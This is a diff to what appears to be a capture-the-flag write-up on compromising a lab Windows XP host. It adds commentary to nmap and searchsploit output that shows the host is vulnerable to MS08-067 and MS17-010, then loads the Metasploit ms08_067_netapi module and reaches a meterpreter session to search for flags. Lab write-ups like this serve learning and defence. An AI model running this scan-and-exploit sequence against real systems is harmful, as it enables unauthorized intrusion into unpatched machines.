@@ -1,5 +1,4 @@
-http://scx020c07c.blogspot.com/2012/09/exploitation-windows-xp-using.html
-
+## NMAP, business as usual
 ```
 hippoeug@kali:~$ nmap -sC -sV -A -v 10.10.10.4 -Pn
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-27 21:57 +08
@@ -36,6 +35,7 @@ Host script results:
 |_smb2-time: Protocol negotiation failed (SMB2)
 
 ```
+Wow, interesting, Windows XP (2000 LAN Manager). Unpatched Windows, hell yeah. Let's see..
 
 ```
 hippoeug@kali:~$ searchsploit windows 2000 smb
@@ -49,28 +49,12 @@ Microsoft Windows XP/2000/NT 4.0 - Network Share Provider SMB Request Buffer Ove
 ------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Shellcodes: No Results
 ```
-
+Hmm, maybe I need something more direct. Let's scan the ports and see.
 
 ```
-ippoeug@kali:~$ sudo nmap -p 445 --script=vuln 10.10.10.4 -v -Pn
+hippoeug@kali:~$ sudo nmap -p 445 --script=vuln 10.10.10.4 -v -Pn
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-27 22:48 +08
-NSE: Loaded 105 scripts for scanning.
-NSE: Script Pre-scanning.
-Initiating NSE at 22:48
-Completed NSE at 22:48, 10.00s elapsed
-Initiating NSE at 22:48
-Completed NSE at 22:48, 0.00s elapsed
-Initiating Parallel DNS resolution of 1 host. at 22:48
-Completed Parallel DNS resolution of 1 host. at 22:48, 0.03s elapsed
-Initiating SYN Stealth Scan at 22:48
-Scanning 10.10.10.4 [1 port]
-Discovered open port 445/tcp on 10.10.10.4
-Completed SYN Stealth Scan at 22:48, 0.04s elapsed (1 total ports)
-NSE: Script scanning 10.10.10.4.
-Initiating NSE at 22:48
-Completed NSE at 22:49, 14.03s elapsed
-Initiating NSE at 22:49
-Completed NSE at 22:49, 0.00s elapsed
+...
 Nmap scan report for 10.10.10.4
 Host is up (0.0051s latency).
 
@@ -110,6 +94,14 @@ Host script results:
 |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
 |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
 ```
+OOH, it's vulnerable to `smb-vuln-ms08-067`. And good ol' `smb-vuln-ms17-010` eternalblue which I'm not gonna attempt on this poor XP machine.
+Let's try it with metasploit. Source: http://scx020c07c.blogspot.com/2012/09/exploitation-windows-xp-using.html
+
+```
+msfconsole
+use exploit/windows/smb/ms08_067_netapi
+```
+And we're in, time to find the flags.
 
 ```
 meterpreter > search -f *.txt
